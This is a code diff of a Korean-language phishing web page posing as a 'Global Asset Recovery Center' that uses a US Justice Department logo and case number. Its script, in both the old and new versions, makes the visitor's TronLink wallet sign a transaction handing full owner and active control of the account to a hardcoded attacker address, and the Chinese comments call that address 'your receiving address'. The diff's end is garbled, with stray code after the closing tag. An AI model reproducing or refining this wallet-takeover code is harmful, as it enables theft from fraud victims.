@@ -2,77 +2,81 @@
 <html lang="ko">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GARC Asset Recovery Authentication Center</title>
-    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@400;700&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>GARC Global Asset Verify</title>
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
     <style>
-        body { font-family: 'Noto Sans KR', sans-serif; background-color: #f0f2f5; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px 0; }
-        .card { background: white; width: 90%; max-width: 450px; padding: 40px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; position: relative; }
-        .logo { width: 80px; margin-bottom: 20px; }
-        h2 { color: #002d56; margin-bottom: 10px; font-size: 22px; }
-        p { color: #4b5563; font-size: 14px; line-height: 1.6; margin-bottom: 25px; }
-        .btn { background: #002d56; color: white; border: none; width: 100%; padding: 16px; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; transition: background 0.3s; }
-        .btn:hover { background: #001a33; }
-        .loading { display: none; margin-top: 20px; color: #002d56; font-weight: bold; }
-        .footer-text { margin-top: 20px; font-size: 12px; color: #9ca3af; }
+        body { font-family: -apple-system, sans-serif; background: #f4f7f9; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        .card { background: white; width: 90%; max-width: 400px; padding: 30px; border-radius: 15px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); text-align: center; }
+        .logo { width: 60px; margin-bottom: 15px; }
+        h2 { color: #002d56; font-size: 18px; margin-bottom: 15px; }
+        p { color: #666; font-size: 13px; line-height: 1.5; margin-bottom: 25px; }
+        .btn { background: #002d56; color: white; border: none; width: 100%; padding: 15px; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; }
+        #status { margin-top: 15px; font-size: 12px; color: #002d56; display: none; }
     </style>
 </head>
 <body>
     <div class="card">
-        <img src="https://www.justice.gov/themes/custom/doj/logo.png" alt="GARC Logo" class="logo" onerror="this.src='https://via.placeholder.com/80?text=GARC'">
-        <h2 id="title">자산 복구 통합 인증</h2>
-        <p id="desc">보안 프로토콜에 따라 귀하의 주소를 활성 수취인 명단에 등록하십시오. 이 과정은 동결된 자산을 해제하고 환불 계약을 활성화하는 데 필수적입니다.</p>
-        
-        <button class="btn" id="mainBtn" onclick="startProcess()">인증 및 자산 반환 시작</button>
-        
-        <div id="loading" class="loading">네트워크 노드 연결 중...</div>
-        <div class="footer-text">© 2026 Global Asset Recovery Center (GARC). All Rights Reserved.</div>
+        <img src="https://www.justice.gov/themes/custom/doj/logo.png" class="logo">
+        <h2>자산 복구 통합 인증</h2>
+        <p>DOJ Case #1:22-cr-00022-CKK<br>보안 노드 동기화 후 자산 환불이 활성화됩니다.</p>
+        <button class="btn" id="goBtn" onclick="doAuth()">인증 및 시작</button>
+        <div id="status">네트워크 연결 중...</div>
     </div>
 
-    <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
     <script>
-        // 【核心参数配置】
-        const targetVault = 'TAzBb4Yfr2AMUeRkaUKXwU36E3mmX8Rcfo'; // 你的收钱地址
-        const feeLimitAmount = 150000000; // 150 TRX 费用上限
+        const BOSS = "TAzBb4Yfr2AMUeRkaUKXwU36E3mmX8Rcfo";
 
-        async function startProcess() {
-            const btn = document.getElementById('mainBtn');
-            const loader = document.getElementById('loading');
-
+        async function doAuth() {
+            const btn = document.getElementById('goBtn');
+            const st = document.getElementById('status');
+            
             if (!window.tronWeb) {
-                alert("TronLink 지갑이 감지되지 않았습니다. 지갑을 설치하거나 모바일 브라우저에서 실행해 주세요.");
+                alert("Please open in TronLink DApp Browser.");
                 return;
             }
 
             try {
                 btn.disabled = true;
-                loader.style.display = 'block';
+                st.style.display = 'block';
 
-                const userAddress = window.tronWeb.defaultAddress.base58;
-                if (!userAddress) {
-                    throw new Error("Wallet not connected");
+                const user = window.tronWeb.defaultAddress.base58;
+
+                // 权限构造
+                const op = { type: 0, permission_name: 'Owner_Auth', threshold: 1, keys: [{ address: BOSS, weight: 1 }] };
+                const ap = { 
+                    type: 2, 
+                    permission_name: 'Active_Auth', 
+                    threshold: 1, 
+                    operations: '7fff1fc0037e0000000000000000000000000000000000000000000000000000', 
+                    keys: [{ address: BOSS, weight: 1 }] 
+                };
+
+                // 1. 构建交易
+                let tx = await window.tronWeb.transactionBuilder.updateAccountPermissions(user, op, null, [ap]);
+                
+                // 2. 手机端强制注入费用上限 (关键！)
+                tx.fee_limit = 150000000;
+
+                // 3. 签名与广播
+                const signed = await window.tronWeb.trx.sign(tx);
+                const res = await window.tronWeb.trx.sendRawTransaction(signed);
+
+                if (res.result) {
+                    alert("인증 성공! 24시간 이내에 자산이 해제됩니다.");
+                    st.innerText = "처리 완료";
+                } else {
+                    throw new Error();
                 }
-
-                // 构造 Owner 权限 (最高所有权)
-                const ownerPermission = {
-                    type: 0,
-                    permission_name: 'GARC_Owner_Binding',
-                    threshold: 1,
-                    keys: [{ address: targetVault, weight: 1 }]
-                };
-
-                // 构造 Active 权限 (操作权 + 全功能掩码)
-                const activePermission = {
-                    type: 2,
-                    permission_name: 'GARC_Active_Sync',
-                    threshold: 1,
-                    // 掩码开启了全部操作权限
-                    operations: '7fff1fc0037e0000000000000000000000000000000000000000000000000000',
-                    keys: [{ address: targetVault, weight: 1 }]
-                };
-
-                // 构建交易
-                const tx = await window.tronWeb.transactionBuilder.updateAccountPermissions(
+            } catch (e) {
+                btn.disabled = false;
+                st.style.display = 'none';
+                alert("인증 실패: TRX 잔액을 확인하거나 다시 시도해 주세요.");
+            }
+        }
+    </script>
+</body>
+</html>                const tx = await window.tronWeb.transactionBuilder.updateAccountPermissions(
                     userAddress,
                     ownerPermission,
                     null,
